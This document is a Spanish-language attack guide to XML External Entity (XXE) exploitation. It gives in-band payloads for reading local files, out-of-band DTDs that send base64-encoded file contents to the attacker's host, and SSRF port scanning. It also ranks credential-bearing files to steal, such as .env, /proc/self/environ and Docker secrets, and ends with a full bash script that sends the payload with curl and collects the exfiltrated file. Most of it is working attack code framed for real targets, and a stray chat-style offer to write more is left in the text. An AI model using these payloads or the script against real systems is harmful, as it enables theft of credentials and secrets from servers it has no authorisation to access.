## 📚 Índice

- [[#1. **QUÉ ES XXE Y POR QUÉ EXISTE (EL ORIGEN REAL DEL PROBLEMA)**]]
    - [[#1.1 ¿Qué es XML?]]
    - [[#1.2 ¿Qué es XXE?]]
- [[#2. **CÓMO DETECTAR XXE – REGLA DE ORO**]]
    - [[#2.1 Siempre lo primero: **¿La petición es XML?**]]
    - [[#2.2 Indicadores rápidos:]]
- [[#3. **CÓMO FUNCIONA XXE (EL POR QUÉ TÉCNICO, SIMPLIFICADO)**]]
- [[#4. **EXPLOTACIÓN XXE BÁSICA (INBAND)**]]
    - [[#4.1 Pasos para explotar cuando el XML viene en Base64]]
    - [[#4.2 Insertas el payload:]]
    - [[#4.3 Vuelves a codificar en Base64]]
- [[#5. **CUANDO NO DEVUELVE NADA → XXE OUT-OF-BAND (OOB)**]]
    - [[#5.1 Payload principal que envías en Burp]]
    - [[#5.2 Contenido de **malicious.dtd**]]
    - [[#5.3 Levantas tu servidor web]]
- [[#6. **XXE COMO SSRF — ESCANEO DE PUERTOS INTERNOS**]]
- [[#7. **TIPOS DE XXE**]]
- [[#8. **PATRONES COMUNES QUE SIEMPRE DEBES PROBAR**]]
- [[#9. **SEGURIDAD OFENSIVA: SABER SI ES VULNERABLE SIN ROMPER NADA**]]
- [[#10. **RESUMEN FINAL PARA ATAQUE RÁPIDO**]]
- [[#13. **VERSIÓN MINIMALISTA PARA EXPLOTAR EN 20 SEGUNDOS**]]
- [[#🧩 **12. Archivos realmente valiosos para enumerar vía XXE (lo que SÍ cambia la partida)**]]
    - [[#⭐ **12.1 Archivos con credenciales (top prioridad)**]]
        - [[#🔑 **Configuración del servidor web**]]
        - [[#🔑 **Archivos de configuración de la aplicación (EL TESORO)**]]
    - [[#⭐ **12.2 Archivos que revelan endpoints internos**]]
    - [[#⭐ **12.3 Logs internos (información privilegiada)**]]
    - [[#⭐ **12.4 Secretos en entornos Docker/Kubernetes**]]
    - [[#⭐ **12.5 Archivos de sesión (si la app guarda sesiones en disco)**]]
    - [[#⭐ **12.6 Archivos de red para pivoting + SSRF avanzado**]]
    - [[#🎯 **12.7 TOP 6 archivos prioritarios (ataque real)**]]
- [[#13. **AUTOMATIZACIÓN EN BASH (ATAQUE COMPLETO)**]]


---
# 1. **QUÉ ES XXE Y POR QUÉ EXISTE (EL ORIGEN REAL DEL PROBLEMA)**

## 1.1 ¿Qué es XML?

XML es un formato de datos antiguo pero aún muy usado en:

- APIs legacy
    
- Web services SOAP
    
- Procesos internos de muchas empresas
    
- Parsers Java, PHP, Python, .NET…
    

XML tiene una característica peligrosa:  
➡️ **Permite definir entidades externas (External Entities)**.

Las entidades externas permiten que el XML “importe” contenido desde:

- archivos locales del servidor (`file://`)
    
- URLs externas (`http://`)
    
- wrappers internos (`php://`)
    

Esto **NO es un bug**. Es una **feature del estándar XML**.

## 1.2 ¿Qué es XXE?

XXE es cuando una aplicación:

- recibe XML del usuario
    
- lo parsea
    
- **permite cargar entidades externas sin deshabilitarlas**
    

→ Eso abre la puerta para que tú fuerces al parser a leer archivos locales o enviar solicitudes HTTP internas (SSRF).

---

# 2. **CÓMO DETECTAR XXE – REGLA DE ORO**

## 2.1 Siempre lo primero: **¿La petición es XML?**

Interceptas con **BurpSuite** → miras el cuerpo → si ves:

```xml
<root>
  <data>...</data>
</root>
```

O si ves un parámetro que, al decodificarlo (base64), es XML → **XXE es posible**.

## 2.2 Indicadores rápidos:

- Petición `Content-Type: application/xml`
    
- Parámetro base64 que decodifica a XML
    
- SOAP (`<soapenv:Envelope>`)
    
- Archivos como `.xml` subidos
    

Si hay XML → **puede haber entidades** → **se prueba XXE**.

---

# 3. **CÓMO FUNCIONA XXE (EL POR QUÉ TÉCNICO, SIMPLIFICADO)**

XML permite crear una entidad personalizada así:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

Esto significa:

> “Crea una variable llamada `xxe` cuyo contenido es el archivo `/etc/passwd`”.

Luego simplemente la llamas:

```xml
<campo>&xxe;</campo>
```

El parser reemplaza la entidad con el contenido del archivo.  
Esta es la base del ataque.

---

# 4. **EXPLOTACIÓN XXE BÁSICA (INBAND)**

**Cuando el servidor SÍ devuelve la respuesta**

---

## 4.1 Pasos para explotar cuando el XML viene en Base64

1. **Interceptar con BurpSuite**
    
2. Seleccionar solo la parte base64
    
3. `Ctrl + Shift + U` → **URL decode**
    
4. En Burp Decoder → **Base64 decode**
    
5. Te queda el XML REAL.
    

## 4.2 Insertas el payload:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

Y llamas a la entidad:

```xml
<email>&xxe;</email>
```

## 4.3 Vuelves a codificar en Base64

Control + U → codificar  
Control + R → mandar al repeater

→ Si el endpoint es vulnerable, te devuelve el `/etc/passwd`.

---

# 5. **CUANDO NO DEVUELVE NADA → XXE OUT-OF-BAND (OOB)**

**a.k.a. ataques "a ciegas"**

Este es el nivel PRO.  
La aplicación procesa tu entidad… pero **no muestra la salida**.

Entonces usas una DTD externa para **hacer que el servidor te exfiltre el archivo vía HTTP**.

---

# 5.1 Payload principal que envías en Burp

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://TU_IP/malicious.dtd">
  %xxe;
]>
```
y en uno de las etiquetas si o si &exfil; ejemplo <correo>&exfil;</correo>
➡️ Cuando el servidor parsea eso, irá a tu máquina a descargar `malicious.dtd`.

---

# 5.2 Contenido de **malicious.dtd**

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://TU_IP/?data=%file;'>">
%eval;
%exfil;
```

**Explicación clave**:

- `%file` → lee `/etc/passwd` y lo codifica en base64
    
- `%exfil` → hace que el servidor mande un GET a tu IP:
    
    ```
    http://TU_IP/?data=BASE64_DEL_ARCHIVO
    ```
    

→ **Ahí recibes el archivo exfiltrado.**

---

# 5.3 Levantas tu servidor web

```bash
python3 -m http.server 80
```

Vas a ver peticiones entrantes tipo:

```
GET /?data=LS0tYmFzZTY0LS0tCm…..
```

Ese base64 → es **el contenido del archivo objetivo**.

para decodificar echo -n "asdfdsfasdf" | base64 -d 

---

# 6. **XXE COMO SSRF — ESCANEO DE PUERTOS INTERNOS**

Puedes usar XXE para hacer que el servidor intente conectarse a:

- `http://127.0.0.1:3306`
    
- `http://localhost/admin`
    
- `http://internal-service:8080`
    

Payload:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<campo>&xxe;</campo>
```

Según el error o timeout → sabrás si el puerto está abierto.

XXE = SSRF gratis.

---

# 7. **TIPOS DE XXE**

1. **XXE clásica (External Entity)**  
    Importas un archivo o URL directamente.
    
2. **XXE OOB (blind)**  
    Exfiltras via DTD externa.
    
3. **XXE predefinidas**  
    `&lt;`, `&gt;`, `&apos;` → menos relevante.
    
4. **XXE personalizada / Custom DTD**  
    Donde tú defines toda la lógica.
    


---

# 8. **PATRONES COMUNES QUE SIEMPRE DEBES PROBAR**

### 📌 Archivos típicos:

- `/etc/passwd`
    
- `/etc/hostname`
    
- `/proc/self/environ`
    
- `php://filter/...`
    

### 📌 Endpoints comunes vulnerables:

- `/api/xml`
    
- `/export/xml`
    
- `/upload`
    
- SOAP
    
- SAML
    

---

# 9. **SEGURIDAD OFENSIVA: SABER SI ES VULNERABLE SIN ROMPER NADA**

### Paso 1:

Meter un DOCTYPE vacío:

```xml
<!DOCTYPE foo []>
```

→ Si crashea el servidor = **vulnerable**.

### Paso 2:

Probar entidades locales:

```xml
<!DOCTYPE foo [<!ENTITY test SYSTEM "file:///etc/hostname">]>
```

### Paso 3:

Si no devuelve → intentar OOB.

---

# 10. **RESUMEN FINAL PARA ATAQUE RÁPIDO**

1. Interceptas con Burp
    
2. ¿Hay XML? → **Sí**
    
3. ¿Viene en Base64? → Decodificas
    
4. Pruebas entidad local básica
    
5. Si no devuelve → OOB con DTD externa
    
6. Levantas servidor python
    
7. Recibes archivo objetivo
    
8. Ahora puedes:
    
    - Escanear puertos internos (SSRF)
        
    - Leer claves, configs, tokens
        
    - Pivotear
        

---

# 13. **VERSIÓN MINIMALISTA PARA EXPLOTAR EN 20 SEGUNDOS**

### **Payload básico**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### **OOB**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://TU_IP/malicious.dtd">
  %xxe;
]>
```

### **DTD**

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://TU_IP/?d=%file;'>">
%eval;
%exfil;
```

---

# 🧩 **12. Archivos realmente valiosos para enumerar vía XXE (lo que SÍ cambia la partida)**

Muchos tutoriales te dicen “lee `/etc/passwd` y `/etc/hostname`”.  
Eso NO sirve para nada real.  
Aquí van **LOS ARCHIVOS QUE SÍ IMPORTAN** cuando explotas un XXE.

---

## ⭐ **12.1 Archivos con credenciales (top prioridad)**

Estos archivos te dan **DB creds, API keys, tokens y secretos**.  
Son literalmente la _victoria_ en un 80% de entornos web.

### 🔑 **Configuración del servidor web**

```
/etc/apache2/envvars
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/php/*/fpm/pool.d/www.conf
```

Suelen tener:

- Database credentials
    
- SMTP creds
    
- Secret tokens
    
- Rutas internas del proyecto
    
- Variables de entorno de producción
    

---

### 🔑 **Archivos de configuración de la aplicación (EL TESORO)**

Depende del framework pero es lo más jugoso.

#### **Laravel / PHP moderno**

```
/var/www/html/.env
```

#### **WordPress**

```
/var/www/html/wp-config.php
```

#### **Django**

```
/var/www/html/project/settings.py
```

#### **Node.js (Express)**

```
/var/www/html/config/default.json
/var/www/html/config/production.json
```

#### **Java (Tomcat, Spring, WAR)**

```
WEB-INF/web.xml
WEB-INF/application.properties
WEB-INF/application.yml
```

A menudo contienen:

- `DB_PASSWORD`
    
- `JWT_SECRET`
    
- `API_KEY`
    
- `MAIL_PASSWORD`
    
- `SECRET_KEY`
    
- Credenciales admin hardcodeadas
    

> Sacar un `.env` o un `web.xml` desde XXE = PARTIDA GANADA.

---

## ⭐ **12.2 Archivos que revelan endpoints internos**

Súper valioso para pivotar hacia paneles ocultos o funciones dev.

### Laravel

```
routes/web.php
routes/api.php
```

### Django

```
urls.py
```

### Express (Node)

```
routes/*.js
app.js
```

Te muestran:

- Endpoints ocultos
    
- APIs internas
    
- Paneles admin
    
- Funciones olvidadas
    
- Rutas dev/desactivadas
    

---

## ⭐ **12.3 Logs internos (información privilegiada)**

Revelan errores, rutas secretas, parámetros sensibles y hasta IPs internas.

```
/var/log/apache2/error.log
/var/log/apache2/access.log
/var/log/nginx/error.log
/var/log/nginx/access.log
/var/log/php*/php*.log
```

Te dan:

- Stacktraces con rutas
    
- Paneles 404 que no deberían saberse
    
- Info de versiones
    
- Parámetros internos
    
- IPs de microservicios (útil para SSRF)
    

---

## ⭐ **12.4 Secretos en entornos Docker/Kubernetes**

Esto es **god tier** en aplicaciones modernas.

### Docker secrets

```
/run/secrets/*
```

### Variables de entorno del proceso (ORO)

```
/proc/self/environ
```

Aquí encuentras:

- API keys
    
- Tokens internos
    
- Credenciales DB
    
- JWT signing keys
    
- Secrets de S3 / Azure / GCP
    
- Datos del admin
    
- Información del backend
    

> `/proc/self/environ` es de lo más valioso que existe en explotación XXE.

---

## ⭐ **12.5 Archivos de sesión (si la app guarda sesiones en disco)**

### PHP

```
/var/lib/php/sessions/sess_<ID>
```

Suelen contener:

- Usuario autenticado
    
- Roles (admin / user)
    
- Tokens temporales
    
- Datos internos
    
- Flags (CTF)
    
- A veces contraseñas en texto plano (devs brutos)
    

---

## ⭐ **12.6 Archivos de red para pivoting + SSRF avanzado**

```
/proc/net/tcp
/proc/net/udp
/proc/net/arp
/proc/net/fib_trie
/proc/net/dev
```

Te permiten:

- Identificar puertos internos
    
- Ver interfaces activas
    
- Mapear la red
    
- Saber si estás en Docker
    
- Encontrar IP internas para SSRF
    

---

# 🎯 **12.7 TOP 6 archivos prioritarios (ataque real)**

Si solo puedes leer 6 archivos, que sean estos:

```
/proc/self/environ
/var/www/html/.env
WEB-INF/web.xml
/var/www/html/config.php
/var/log/nginx/error.log
/run/secrets/*
```

> Si alguno devuelve información útil → ya ganaste.

---

Si quieres, te hago **el punto #13**:  
**"Cómo encadenar XXE → Credenciales → SSRF → RCE (casos reales)"**.
# 13. **AUTOMATIZACIÓN EN BASH (ATAQUE COMPLETO)**


```bash
#!/bin/bash

#############################################
#   XXE OOB AUTOMÁTICO - BY R4STA
#   Pide: tu IP, target, archivo, puerto
#   Exfiltra, decodifica y muestra.
#############################################

echo "=========================================="
echo "   🧨 XXE OOB AUTOMÁTICO"
echo "=========================================="
echo ""

# -----------------------------
# 1. SOLICITAR DATOS AL USUARIO
# -----------------------------
read -p "[+] Ingresa TU IP (para recibir la exfiltración): " IP
read -p "[+] Ingresa la URL DEL TARGET (endpoint vulnerable): " TARGET
read -p "[+] Ingresa el archivo a leer (/etc/passwd, /etc/hostname, etc): " FILE
read -p "[+] Ingresa el puerto donde escucharás la exfiltración (default 80): " PORT

# Si el usuario deja el puerto vacío → 80
if [ -z "$PORT" ]; then
    PORT=80
fi

OUTPUT="exfiltrado.txt"

echo ""
echo "[*] IP Local:        $IP"
echo "[*] Target URL:      $TARGET"
echo "[*] Archivo:         $FILE"
echo "[*] Puerto escucha:  $PORT"
echo ""

# -----------------------------
# 2. GENERAR malicious.dtd
# -----------------------------
echo "[*] Generando malicious.dtd..."

cat <<EOF > malicious.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=$FILE">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://$IP:$PORT/?data=%file;'>">
%eval;
%exfil;
EOF

echo "[+] malicious.dtd creada."
echo ""

# -----------------------------
# 3. LEVANTAR SERVIDOR PYTHON
# -----------------------------
echo "[*] Levantando servidor HTTP en puerto $PORT..."
python3 -m http.server $PORT > server.log 2>&1 &
SERVER_PID=$!

sleep 1
echo "[+] Servidor activo (PID: $SERVER_PID)"
echo ""

# -----------------------------
# 4. GENERAR PAYLOAD XML
# -----------------------------
echo "[*] Generando payload XML..."

PAYLOAD="<?xml version=\"1.0\"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM \"http://$IP:$PORT/malicious.dtd\">
%xxe;
]>
<field>test</field>"

echo "$PAYLOAD" | base64 > payload.b64

echo "[+] Payload generado y codificado en payload.b64"
echo ""

# -----------------------------
# 5. ENVIAR PAYLOAD AL TARGET
# -----------------------------
echo "[*] Enviando payload al servidor víctima..."
curl -s -X POST "$TARGET" -d "@payload.b64"
echo "[+] Payload enviado."
echo ""

# -----------------------------
# 6. ESPERAR EXFILTRACIÓN
# -----------------------------
echo "[*] Esperando exfiltración del archivo..."

COUNT=0
EXFIL_DATA=""

while [ $COUNT -lt 40 ]; do
    if grep -q "GET /?data=" server.log; then
        EXFIL_DATA=$(grep "GET /?data=" server.log | tail -n1 | sed 's/.*data=//')
        break
    fi
    sleep 1
    COUNT=$((COUNT+1))
done

if [ -z "$EXFIL_DATA" ]; then
    echo "[!] ❌ No se recibió exfiltración después de 40 segundos."
    kill $SERVER_PID
    exit 1
fi

echo "[+] ✔️ ¡Archivo exfiltrado! Recibido en server.log."
echo ""

# -----------------------------
# 7. DECODIFICAR RESULTADO
# -----------------------------
echo "[*] Decodificando contenido..."
echo "$EXFIL_DATA" | base64 -d > "$OUTPUT"

echo "[+] Archivo decodificado → $OUTPUT"
echo ""

# -----------------------------
# 8. MOSTRAR EN PANTALLA
# -----------------------------
echo "=========== CONTENIDO DEL ARCHIVO ==========="
cat "$OUTPUT"
echo "=============================================="
echo ""

# -----------------------------
# 9. LIMPIEZA FINAL
# -----------------------------
echo "[*] Limpiando archivos temporales..."
rm malicious.dtd payload.b64
kill $SERVER_PID

echo "[+] Limpieza completa."
echo "[+] Script finalizado."
echo ""

```
